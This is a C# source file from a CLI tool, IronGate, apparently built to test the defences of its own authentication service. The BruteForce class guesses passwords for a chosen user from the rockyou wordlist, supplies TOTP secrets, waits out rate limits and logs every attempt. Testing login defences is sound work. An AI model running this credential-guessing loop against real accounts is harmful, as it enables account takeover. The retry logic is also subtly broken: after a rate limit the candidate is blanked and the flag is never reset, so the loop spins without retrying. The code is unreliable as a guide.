using IronGate.Cli.Constants;
using IronGate.Cli.Helpers;
using IronGate.Cli.Helpers.Dto;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
#nullable enable

namespace IronGate.Cli {

    internal class BruteForce { 


        public static async Task RunAsync(HttpClient http, AuthConfigDto config,UserSeed seed,string username) {

            // Folder base directory, and find the rockyou file
            var baseDir = AppDomain.CurrentDomain.BaseDirectory;
            var passwordList = Path.IsPathRooted(Defaults.RockYou)
                ? Defaults.RockYou
                : Path.Combine(baseDir, Defaults.RockYou);

            if (!File.Exists(passwordList)) {
                Console.WriteLine($"Wordlist not found: {passwordList}");
                return;
            }

            // Wiat time for rate limit, with max http attempts & runtime as configured in defaults
            var waitTime = config.RateLimitEnabled ? config.RateLimitWindowSeconds : null;
            var maxHttpAttempts = Defaults.DefaultLimit;
            var maxRunTime = TimeSpan.FromSeconds(Defaults.TimeLimitSeconds);
            var rateLimit = false;
            // We try to get the totpsecret + group seed if it exists for this user
            seed.TotpSecrets.TryGetValue(username, out var totpSec);
            totpSec ??= string.Empty;
            var groupSeed = seed.GroupSeed ?? string.Empty;
            Console.WriteLine($"Group Seed: {groupSeed}");

            // Mark the log paths
            var logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "brute_force_log.jsonl");
            using var log = new StreamWriter(logPath, append: true, Encoding.UTF8);

            // Print the beginning of the attack TODO: Move this to printers
            Console.WriteLine($"Attack: Brute Force, User: {username}");
            Console.WriteLine($"Stop Conditions: Success/Locked/Runtime({maxRunTime.TotalSeconds}s)/HttpAttempts({maxHttpAttempts})");
            Console.WriteLine($"Log:  {logPath}");

            // Start the stopwatch, attack has begun
            var started = Stopwatch.StartNew();
            var httpAttempts = new Counter();

            // configure ctrl+c to stop
            using var cancelSource = new CancellationTokenSource();
            void handler(object s, ConsoleCancelEventArgs e) {
                e.Cancel = true;
                cancelSource.Cancel();
            }
            Console.CancelKeyPress += handler;


            using var streamReader = new StreamReader(passwordList, Encoding.UTF8);

            while (!streamReader.EndOfStream && !cancelSource.IsCancellationRequested) {

                if (started.Elapsed > maxRunTime) {
                    Console.WriteLine("Stopped: Runtime limit reached.");
                    return;
                }

                if (httpAttempts.Value >= maxHttpAttempts) {
                    Console.WriteLine("Stopped: Attempts limit reached.");
                    return;
                }

                // We get a password candidate from the file, only if we did not hit a rate limit. If we did, we try again with some one!
                string candidate = "";
                if (!rateLimit){
                    candidate = await streamReader.ReadLineAsync().ConfigureAwait(false);
                    if (candidate == null) break;
                }

                candidate = candidate.Trim();
                if (candidate.Length == 0) continue;

                // New basic login action array
                var args = new[] { "login", username, candidate, "-", "-" };

                // Send the login action, with the httpAttempts for incrementation
                var (printHelp, resp) = await Login.LoginAction(http, args, groupSeed, totpSec, httpAttempts, log).ConfigureAwait(false);

                // Variables that will hold the result status
                AuthResultCode? resultCode = null;
                bool success = false;
                if (resp != null && HttpUtil.TryReadAuthAttempt(resp, out var attempt)) {

                    resultCode = attempt!.Result;
                    success = attempt.Success;
                }

                // If we got a rate limit, we just wait the time from the config request
                if (resultCode == AuthResultCode.RateLimited) {
                    if (waitTime.HasValue && waitTime.Value > 0) {
                        Console.WriteLine($"Rate limit hit! Waiting for {waitTime.Value} seconds");
                        await Task.Delay(TimeSpan.FromSeconds(waitTime.Value), cancelSource.Token).ConfigureAwait(false);
                        rateLimit = true;
                    }
                    
                    continue;
                }

                if (resultCode == AuthResultCode.LockedOut) {
                    Console.WriteLine("Account got locked! Need to wait for admin to unlock OR password reset!");
                    return;
                }
                if (success) {
                    Console.WriteLine("Success! We successfuly brute forced into an account!");
                    return;
                }

            }

            Console.WriteLine("We hit our default cap or finished our file!!");

        }




    }
}
